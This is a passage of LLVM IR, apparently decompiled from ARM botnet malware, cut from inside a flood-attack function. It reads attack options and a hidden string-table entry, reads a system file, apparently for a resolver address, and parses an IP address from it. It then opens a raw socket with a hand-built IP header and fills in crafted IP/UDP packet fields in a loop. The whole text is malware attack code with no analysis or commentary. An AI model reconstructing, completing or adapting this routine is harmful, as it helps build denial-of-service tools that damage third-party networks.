  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c21c = load i32, i32* @r4, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v0_c220 = load i32, i32* @r5, align 4
  store i32 %v0_c220, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c204, 16777216
  %v5_c228 = sdiv i32 %sext22, 16777216
  %v6_c228 = inttoptr i32 %v0_c220 to i32*
  %v7_c228 = call i32 @attack_get_opt_int(i32 %v0_c21c, i32* %v6_c228, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v5_c228)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c240 = inttoptr i32 %v0_c22c to i32*
  %v6_c240 = call i32 @attack_get_opt_int(i32 %v0_c238, i32* %v5_c240, i32 4, i32 64, i32 %v7_c228)
  %v1_c248 = urem i32 %v6_c240, 256
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  %v0_c24c = load i32, i32* @r5, align 4
  store i32 %v0_c24c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  store i32 %v0_c258, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c240, 16777216
  %v5_c260 = sdiv i32 %sext23, 16777216
  %v6_c260 = inttoptr i32 %v0_c24c to i32*
  %v7_c260 = call i32 @attack_get_opt_int(i32 %v0_c258, i32* %v6_c260, i32 5, i32 0, i32 %v5_c260)
  %v1_c26c = urem i32 %v7_c260, 256
  store i32 %v1_c26c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c278 = load i32, i32* @r4, align 4
  store i32 %v0_c278, i32* %r0.global-to-local, align 4
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  %v5_c284 = inttoptr i32 %v0_c27c to i32*
  %v6_c284 = call i32 @attack_get_opt_int(i32 %v0_c278, i32* %v5_c284, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_c26c)
  %v0_c288 = load i32, i32* @r5, align 4
  store i32 %v0_c288, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c294 = load i32, i32* @r4, align 4
  store i32 %v0_c294, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c29c = inttoptr i32 %v0_c288 to i32*
  %v6_c29c = call i32 @attack_get_opt_int(i32 %v0_c294, i32* %v5_c29c, i32 7, i32 53, i32 %v6_c284)
  %v0_c2a8 = load i32, i32* @r5, align 4
  store i32 %v0_c2a8, i32* %r1.global-to-local, align 4
  %v0_c2ac = load i32, i32* @r4, align 4
  store i32 %v0_c2ac, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_c2b8 = inttoptr i32 %v0_c2a8 to i32*
  %v6_c2b8 = call i32 @attack_get_opt_int(i32 %v0_c2ac, i32* %v5_c2b8, i32 9, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_c29c)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c2c8 = load i32, i32* @r4, align 4
  store i32 %v0_c2c8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @attack_get_opt_int(i32 %v0_c2c8, i32* %v5_c2d0, i32 0, i32 12, i32 %v6_c2b8)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r5, align 4
  store i32 %v0_c2dc, i32* %r1.global-to-local, align 4
  store i32 %v6_c2d0, i32* %sb.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v4_c2e8 = inttoptr i32 %v0_c2dc to i32*
  %v5_c2e8 = call i32 @attack_get_opt_str(i32 %v0_c2e4, i32* %v4_c2e8, i32 8, i32 0)
  store i32 %v5_c2e8, i32* @r7, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @table_unlock_val(i32 26)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_c300 = call i32 @table_retrieve_val(i32 26, i32* null)
  store i32 %v3_c300, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c308 = call i32 @__libc_open(i32 %v3_c300, i32 0)
  store i32 %v2_c308, i32* @r4, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_c314 = call i32 @table_lock_val(i32 26)
  store i32 %v1_c314, i32* %r0.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  %v1_c318 = icmp slt i32 %v0_c318, 0
  %v2_c318 = icmp eq i32 %v0_c318, 0
  store i1 %v2_c318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c318, label %dec_label_pc_c814, label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %entry
  %v2_c324 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c324, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_c324, i32* @r1, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v1_c334 = call i32 @__libc_read(i32 %v0_c318)
  store i32 %v1_c334, i32* @r5, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v1_c340 = call i32 @__GI___libc_close(i32 %v0_c33c)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_c348 = call i32 @table_unlock_val(i32 27)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_c354 = call i32 @table_retrieve_val(i32 27, i32* null)
  %v0_c358 = load i32, i32* @r5, align 4
  store i32 %v0_c358, i32* @r1, align 4
  store i32 %v3_c354, i32* %r2.global-to-local, align 4
  store i32 %v2_c324, i32* %r0.global-to-local, align 4
  %v3_c364 = bitcast i32* %stack_var_-2124 to i8*
  %v4_c364 = call i32 @util_stristr(i8* %v3_c364, i32 %v0_c358, i32 %v3_c354)
  store i32 %v4_c364, i32* @r6, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_c370 = call i32 @table_lock_val(i32 27)
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v0_c374 = load i32, i32* @r6, align 4
  %v7_c374 = icmp eq i32 %v0_c374, -1
  store i1 %v7_c374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c374, label %dec_label_pc_c814, label %dec_label_pc_c37c

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c320
  %v0_c37c = load i32, i32* @r5, align 4
  %v9_c37c = icmp eq i32 %v0_c37c, %v0_c374
  store i1 %v9_c37c, i1* %cpsr_z.global-to-local, align 1
  %v7_c380 = icmp sgt i32 %v0_c37c, %v0_c374
  br i1 %v7_c380, label %dec_label_pc_c384, label %dec_label_pc_c814

dec_label_pc_c384:                                ; preds = %dec_label_pc_c37c
  %v0_c384 = load i32, i32* @sl, align 4
  %v2_c384 = add i32 %v0_c384, %v0_c374
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v0_c374, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c3b0 = add i32 %v0_c37c, -1
  br label %dec_label_pc_c3a8

dec_label_pc_c394:                                ; preds = %dec_label_pc_c3d0, %bb104
  %v9_c394 = icmp eq i32 %v1_c3b0, %v0_c39c
  store i1 %v9_c394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c394, label %dec_label_pc_c3e0, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c3c0, %dec_label_pc_c394, %bb
  %v0_c3cc29 = phi i32 [ %v0_c3cc, %dec_label_pc_c3c0 ], [ %v0_c3cc30, %dec_label_pc_c394 ], [ %v0_c3cc, %bb ]
  %v0_c3ac25 = phi i32 [ 0, %dec_label_pc_c3c0 ], [ %v0_c3ac26, %dec_label_pc_c394 ], [ 0, %bb ]
  %v1_c39c = add i32 %v0_c39c, 1
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v9_c3a0 = icmp eq i32 %v1_c39c, %v0_c37c
  store i1 %v9_c3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c3a0, label %dec_label_pc_c814, label %dec_label_pc_c3a8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c384
  %v0_c39c = phi i32 [ %v1_c39c, %dec_label_pc_c39c ], [ %v0_c374, %dec_label_pc_c384 ]
  %v0_c3cc = phi i32 [ %v0_c3cc29, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3ac = phi i32 [ %v0_c3ac25, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3b4 = phi i32 [ %v1_c3b4, %dec_label_pc_c39c ], [ %v2_c384, %dec_label_pc_c384 ]
  %v1_c3a8 = inttoptr i32 %v0_c3b4 to i8*
  %v2_c3a8 = load i8, i8* %v1_c3a8, align 1
  %v3_c3a8 = zext i8 %v2_c3a8 to i32
  store i32 %v3_c3a8, i32* %r3.global-to-local, align 4
  %v2_c3ac = icmp eq i32 %v0_c3ac, 0
  store i1 %v2_c3ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c3b0, i32* @r4, align 4
  %v1_c3b4 = add i32 %v0_c3b4, 1
  store i32 %v1_c3b4, i32* %r1.global-to-local, align 4
  %v1_c3b8 = add nsw i32 %v3_c3a8, -48
  store i32 %v1_c3b8, i32* %r0.global-to-local, align 4
  br i1 %v2_c3ac, label %dec_label_pc_c3c0, label %dec_label_pc_c3d0

dec_label_pc_c3c0:                                ; preds = %dec_label_pc_c3a8
  %v7_c3c0 = icmp eq i8 %v2_c3a8, 9
  store i1 %v7_c3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3c0, label %dec_label_pc_c39c, label %bb

bb:                                               ; preds = %dec_label_pc_c3c0
  %v8_c3c4 = icmp eq i8 %v2_c3a8, 32
  store i1 %v8_c3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c3c4, label %dec_label_pc_c39c, label %dec_label_pc_c3cc

dec_label_pc_c3cc:                                ; preds = %bb
  %v1_c3cc = add i32 %v0_c3cc, 1
  store i32 %v1_c3cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c3d0

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3a8, %dec_label_pc_c3cc
  %v0_c3cc30 = phi i32 [ %v0_c3cc, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v0_c3ac26 = phi i32 [ %v0_c3ac, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v7_c3d0 = icmp eq i8 %v2_c3a8, 46
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c394, label %bb104

bb104:                                            ; preds = %dec_label_pc_c3d0
  %v8_c3d4 = icmp eq i32 %v1_c3b8, 9
  store i1 %v8_c3d4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c3b8, 10
  br i1 %tmp, label %dec_label_pc_c394, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %bb104
  br label %dec_label_pc_c3e0

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c394, %dec_label_pc_c3dc
  %v0_c39c127 = phi i32 [ %v0_c39c, %dec_label_pc_c3dc ], [ %v1_c3b0, %dec_label_pc_c394 ]
  %v2_c3e4 = sub i32 %v0_c39c127, %v0_c374
  store i32 %v2_c3e4, i32* @r4, align 4
  %v2_c3e8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e8, i32* %r0.global-to-local, align 4
  store i32 %v2_c3e4, i32* %r2.global-to-local, align 4
  %v3_c3f8 = call i32 @util_memcpy(i32 %v2_c3e8, i32 %v2_c384, i32 %v2_c3e4)
  %v2_c3fc = ptrtoint i32* %stack_var_-40 to i32
  %v1_c400 = load i32, i32* @r4, align 4
  %v2_c400 = add i32 %v1_c400, %v2_c3fc
  store i32 %v2_c400, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3e8, i32* @r0, align 4
  %v3_c40c = add i32 %v2_c400, -36
  %v4_c40c = inttoptr i32 %v3_c40c to i8*
  store i8 0, i8* %v4_c40c, align 1
  %v1_c410 = call i32 @inet_addr(i32 %v2_c3e8)
  store i32 %v1_c410, i32* %r0.global-to-local, align 4
  store i32 %v1_c410, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c4189:                               ; preds = %dec_label_pc_c814
  unreachable

dec_label_pc_c418:                                ; preds = %dec_label_pc_c874, %dec_label_pc_c86c, %dec_label_pc_c860, %dec_label_pc_c850, %dec_label_pc_c3e0
  %v1_c84c50 = phi i32 [ %v1_c818, %dec_label_pc_c874 ], [ %v1_c818, %dec_label_pc_c86c ], [ %v1_c818, %dec_label_pc_c860 ], [ %v1_c818, %dec_label_pc_c850 ], [ %v1_c410, %dec_label_pc_c3e0 ]
  %v0_c418 = load i32, i32* @r7, align 4
  %v2_c418 = icmp eq i32 %v0_c418, 0
  store i1 %v2_c418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c418, label %dec_label_pc_c840, label %dec_label_pc_c420

dec_label_pc_c420:                                ; preds = %dec_label_pc_c418
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v0_c418 to i8*
  %v2_c424 = call i32 @util_strlen(i8* %v1_c424)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c424, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c438 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v7_c43c = icmp eq i32 %v3_c438, -1
  store i1 %v7_c43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c43c, label %dec_label_pc_c840, label %dec_label_pc_c448

dec_label_pc_c448:                                ; preds = %dec_label_pc_c420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c450 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c450, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c464 = call i32 @__GI_setsockopt(i32 %v3_c438, i32 0, i32 3, i32 %v6_c450, i32 4)
  store i32 %v5_c464, i32* %r0.global-to-local, align 4
  %v7_c468 = icmp eq i32 %v5_c464, -1
  store i1 %v7_c468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c468, label %dec_label_pc_c838, label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c448
  %v0_c478 = load i32, i32* %sb.global-to-local, align 4
  %v1_c478 = urem i32 %v0_c478, 256
  store i32 %v1_c478, i32* %sb.global-to-local, align 4
  %v3_c480 = mul i32 %v6_c284, 65536
  store i32 %v3_c480, i32* %r3.global-to-local, align 4
  %v5_c48c = trunc i32 %v0_c478 to i8
  %v0_c490 = load i32, i32* @r8, align 4
  %v2_c490 = icmp eq i32 %v0_c490, 0
  store i1 %v2_c490, i1* %cpsr_z.global-to-local, align 1
  %v3_c494 = urem i32 %v7_c228, 65536
  store i32 %v3_c494, i32* %r0.global-to-local, align 4
  %v3_c49c = urem i32 %v6_c284, 65536
  store i32 %v3_c49c, i32* %r2.global-to-local, align 4
  %v3_c4a0 = mul i32 %v6_c29c, 65536
  %v3_c4a4 = mul i32 %v6_c2b8, 65536
  store i32 %v3_c4a4, i32* %ip.global-to-local, align 4
  br i1 %v2_c490, label %bb105, label %bb106

bb105:                                            ; preds = %dec_label_pc_c470
  %v5_c4ac = sext i8 %v5_c48c to i32
  store i32 %v5_c4ac, i32* %r2.global-to-local, align 4
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_c470, %bb105
  %v2_c4d8 = phi i32 [ %v3_c49c, %dec_label_pc_c470 ], [ %v5_c4ac, %bb105 ]
  %v3_c4b8 = urem i32 %v6_c29c, 65536
  store i32 %v3_c4b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c4c0 = urem i32 %v6_c2b8, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c4d8 = load i32, i32* @r6, align 4
  br i1 %v2_c490, label %.dec_label_pc_c6c0.preheader_crit_edge, label %dec_label_pc_c4e0

.dec_label_pc_c6c0.preheader_crit_edge:           ; preds = %bb106
  %v3_c4d8 = add i32 %v1_c4d8, %v2_c4d8
  store i32 %v3_c4d8, i32* @r7, align 4
  %.pre = sext i8 %v5_c48c to i32
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c4e0:                                ; preds = %bb106
  %v2_c4e0 = add i32 %v1_c4d8, %v1_c478
  %v3_c4e4 = mul i32 %v2_c4e0, 65536
  %v1_c4ec = add i32 %v3_c4e4, 1769472
  %v1_c4f0 = add i32 %v3_c4e4, 3080192
  %tmp107 = udiv i32 %v1_c4f0, 256
  %v3_c504 = and i32 %tmp107, 65280
  %v4_c514 = udiv i32 %v1_c4f0, 16777216
  %v5_c514 = or i32 %v3_c504, %v4_c514
  store i32 %v5_c514, i32* @sl, align 4
  %trunc61 = trunc i32 %v6_c284 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc61)
  %tmp108 = mul i32 %v7_c228, 256
  %v3_c528 = and i32 %tmp108, 65280
  store i32 %v3_c528, i32* %r1.global-to-local, align 4
  %tmp109 = udiv i32 %v7_c228, 256
  %v4_c52c = urem i32 %tmp109, 256
  %v5_c52c = or i32 %v4_c52c, %v3_c528
  store i32 %v5_c52c, i32* @sb, align 4
  store i32 %v3_c4a4, i32* %r2.global-to-local, align 4
  store i32 %v3_c4a0, i32* %r0.global-to-local, align 4
  %tmp110 = mul i32 %v6_c29c, 256
  %v3_c540 = and i32 %tmp110, 65280
  %tmp111 = mul i32 %v6_c2b8, 256
  %v3_c544 = and i32 %tmp111, 65280
  %tmp112 = udiv i32 %v1_c4ec, 256
  %v3_c548 = and i32 %tmp112, 65280
  store i32 %v3_c548, i32* @lr, align 4
  %tmp113 = udiv i32 %v6_c29c, 256
  %v4_c54c = urem i32 %tmp113, 256
  %v5_c54c = or i32 %v4_c54c, %v3_c540
  store i32 %v5_c54c, i32* %ip.global-to-local, align 4
  %tmp114 = udiv i32 %v6_c2b8, 256
  %v4_c550 = urem i32 %tmp114, 256
  %v5_c550 = or i32 %v4_c550, %v3_c544
  store i32 %v5_c550, i32* @r4, align 4
  %v1_c554 = add i32 %v1_c4d8, 1
  store i32 %v1_c554, i32* %r3.global-to-local, align 4
  %v4_c558 = udiv i32 %v1_c4ec, 16777216
  %v5_c558 = or i32 %v4_c558, %tmp112
  store i32 0, i32* @r5, align 4
  %v4_c5dc = sext i8 %v5_c48c to i32
  %sext = mul nuw i32 %v5_c54c, 65536
  %v7_c5f0 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c550, 65536
  %v4_c618 = sdiv i32 %sext8, 65536
  %v1_c5b8 = trunc i32 %v5_c228 to i8
  %extract.t = trunc i32 %v5_c260 to i8
  %v1_c5e0 = add nsw i32 %v4_c5dc, 41
  %sext121 = mul i32 %v5_c558, 65536
  %v3_c5f0 = sdiv i32 %sext121, 65536
  br label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c690, %dec_label_pc_c4e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c578 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_c578, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ec, i32* %ip.global-to-local, align 4
  %v3_c580 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c580, i32* %r3.global-to-local, align 4
  %v2_c584 = load i32, i32* @r5, align 4
  %v5_c584 = mul i32 %v2_c584, 4
  %v6_c584 = add i32 %v5_c584, %v2_c1ec
  %v7_c584 = inttoptr i32 %v6_c584 to i32*
  store i32 %v2_c578, i32* %v7_c584, align 4
  %v0_c588 = load i32, i32* %ip.global-to-local, align 4
  %v1_c588 = load i32, i32* %r3.global-to-local, align 4
  %v4_c588 = mul i32 %v1_c588, 4
  %v5_c588 = add i32 %v4_c588, %v0_c588
  %v6_c588 = inttoptr i32 %v5_c588 to i32*
  %v7_c588 = load i32, i32* %v6_c588, align 4
  store i32 %v7_c588, i32* %r1.global-to-local, align 4
  %v1_c58c = inttoptr i32 %v7_c588 to i8*
  %v2_c58c = load i8, i8* %v1_c58c, align 1
  %tmp132 = urem i8 %v2_c58c, 16
  %v1_c590 = zext i8 %tmp132 to i32
  %v1_c594 = or i32 %v1_c590, 64
  store i32 %v1_c594, i32* %r2.global-to-local, align 4
  %v1_c598 = trunc i32 %v1_c594 to i8
  store i8 %v1_c598, i8* %v1_c58c, align 1
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v1_c59c = inttoptr i32 %v0_c59c to i8*
  %v2_c59c = load i8, i8* %v1_c59c, align 1
  %v3_c59c = zext i8 %v2_c59c to i32
  %v1_c5a0 = and i32 %v3_c59c, 240
  %v1_c5a4 = or i32 %v1_c5a0, 5
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  store i32 %v1_c26c, i32* %lr.global-to-local, align 4
  %v1_c5ac = trunc i32 %v1_c5a4 to i8
  store i8 %v1_c5ac, i8* %v1_c59c, align 1
  store i32 %v5_c228, i32* %r0.global-to-local, align 4
  %v0_c5b4 = load i32, i32* %lr.global-to-local, align 4
  %v2_c5b4 = icmp eq i32 %v0_c5b4, 0
  store i1 %v2_c5b4, i1* %cpsr_z.global-to-local, align 1
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 1
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i8*
  store i8 %v1_c5b8, i8* %v4_c5b8, align 1
  store i32 %v5_c260, i32* %r2.global-to-local, align 4
  %v0_c5c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5c0, label %.thread11, label %bb115

bb115:                                            ; preds = %dec_label_pc_c570
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c5c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_c5c4 = add i32 %v3_c5c4, 6
  %v5_c5c4 = inttoptr i32 %v4_c5c4 to i16*
  store i16 64, i16* %v5_c5c4, align 2
  %v0_c5cc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t53 = trunc i32 %v0_c5cc.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c570, %bb115
  %v0_c5cc.off0 = phi i8 [ %extract.t, %dec_label_pc_c570 ], [ %extract.t53, %bb115 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c5cc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5cc = add i32 %v2_c5cc, 8
  %v4_c5cc = inttoptr i32 %v3_c5cc to i8*
  store i8 %v0_c5cc.off0, i8* %v4_c5cc, align 1
  %v0_c5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d0 = trunc i32 %v0_c5d0 to i8
  %v2_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5d0 = add i32 %v2_c5d0, 9
  %v4_c5d0 = inttoptr i32 %v3_c5d0 to i8*
  store i8 %v1_c5d0, i8* %v4_c5d0, align 1
  %v2_c5d8 = load i32, i32* @global_var_24f78.59, align 4
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c5e4 = add i32 %v1_c5e0, %v0_c5e0
  store i32 %v2_c5e4, i32* @r4, align 4
  %v2_c5e8 = add i32 %v0_c5e0, 12
  %v3_c5e8 = inttoptr i32 %v2_c5e8 to i32*
  store i32 %v2_c5d8, i32* %v3_c5e8, align 4
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  store i32 %v7_c5f0, i32* %r3.global-to-local, align 4
  %v0_c5f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 20
  store i32 %v1_c5f4, i32* %ip.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @sl, align 4
  %v1_c5f8 = trunc i32 %v0_c5f8 to i16
  %v3_c5f8 = add i32 %v0_c5f4, 2
  %v4_c5f8 = inttoptr i32 %v3_c5f8 to i16*
  store i16 %v1_c5f8, i16* %v4_c5f8, align 2
  %v0_c5fc = load i32, i32* @sb, align 4
  %v1_c5fc = trunc i32 %v0_c5fc to i16
  %v2_c5fc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5fc = add i32 %v2_c5fc, 4
  %v4_c5fc = inttoptr i32 %v3_c5fc to i16*
  store i16 %v1_c5fc, i16* %v4_c5fc, align 2
  %v0_c600 = load i32, i32* %r2.global-to-local, align 4
  %v1_c600 = trunc i32 %v0_c600 to i16
  %v2_c600 = load i32, i32* %ip.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 4
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v0_c604 = load i32, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i16
  %v2_c604 = load i32, i32* %ip.global-to-local, align 4
  %v3_c604 = add i32 %v2_c604, 2
  %v4_c604 = inttoptr i32 %v3_c604 to i16*
  store i16 %v1_c604, i16* %v4_c604, align 2
  %v2_c60c = load i32, i32* %r1.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 20
  %v4_c60c = inttoptr i32 %v3_c60c to i16*
  store i16 %rev, i16* %v4_c60c, align 2
  store i32 %v4_c5dc, i32* %ip.global-to-local, align 4
  %v0_c614 = load i32, i32* %r1.global-to-local, align 4
  %v1_c614 = add i32 %v0_c614, 28
  store i32 %v1_c614, i32* %r0.global-to-local, align 4
  store i32 %v4_c618, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c624 = add i32 %v0_c614, 30
  %v4_c624 = inttoptr i32 %v3_c624 to i16*
  store i16 1, i16* %v4_c624, align 2
  %v0_c628 = load i32, i32* @lr, align 4
  %v1_c628 = trunc i32 %v0_c628 to i16
  %v2_c628 = load i32, i32* %r0.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 4
  %v4_c628 = inttoptr i32 %v3_c628 to i16*
  store i16 %v1_c628, i16* %v4_c628, align 2
  %v0_c62c = load i32, i32* %ip.global-to-local, align 4
  %v1_c62c = trunc i32 %v0_c62c to i8
  %v2_c62c = load i32, i32* %r1.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 40
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 %v1_c62c, i8* %v4_c62c, align 1
  %v0_c630 = load i32, i32* @fp, align 4
  %v1_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v0_c630, i32* %v3_c630, align 4
  %v0_c634 = load i32, i32* %r3.global-to-local, align 4
  %v1_c634 = trunc i32 %v0_c634 to i16
  %v2_c634 = load i32, i32* %r1.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 28
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %v1_c634, i16* %v4_c634, align 2
  %v0_c638 = load i32, i32* @r4, align 4
  %v1_c638 = add i32 %v0_c638, 1
  store i32 %v1_c638, i32* %r0.global-to-local, align 4
  %v0_c63c = load i32, i32* @r7, align 4
  store i32 %v0_c63c, i32* %r1.global-to-local, align 4
  store i32 %v1_c554, i32* %r2.global-to-local, align 4
  %v3_c644 = call i32 @util_memcpy(i32 %v1_c638, i32 %v0_c63c, i32 %v1_c554)
  store i32 %v3_c644, i32* %r0.global-to-local, align 4
  %v0_c648 = load i32, i32* @r6, align 4
  %v2_c648 = icmp eq i32 %v0_c648, 0
  store i1 %v2_c648, i1* %cpsr_z.global-to-local, align 1
  %tmp116 = icmp slt i32 %v0_c648, 1
  br i1 %tmp116, label %bb117, label %dec_label_pc_c658

bb117:                                            ; preds = %.thread11
  %v5_c64c = load i32, i32* @r4, align 4
  store i32 %v5_c64c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c690

dec_label_pc_c658:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
